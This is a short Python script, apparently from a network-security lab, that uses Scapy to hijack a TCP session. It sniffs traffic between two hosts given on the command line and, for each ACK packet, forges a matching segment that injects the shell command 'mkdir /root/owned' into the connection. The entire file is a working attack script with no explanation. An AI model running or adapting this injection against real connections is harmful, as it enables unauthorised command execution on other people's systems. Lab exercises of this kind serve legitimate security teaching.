import sys
from scapy.all import *

def pkt_handler(pkt):
        if "A" in pkt[TCP].flags:
                ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
                tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, seq=pkt[TCP].seq, ack=pkt[TCP].ack, flags=pkt[TCP].flags)
                command = Raw(load="mkdir /root/owned \n")
                sendp(ip/tcp/command, iface="br-tcphijack")

if __name__ == "__main__":
        src_addr = str(sys.argv[1])
        dst_addr = str(sys.argv[2])

        filter = "tcp and src host {} and dst host {}".format(src_addr, dst_addr)
        pkt = sniff(iface="br-tcphijack", filter=filter, prn=pkt_handler)
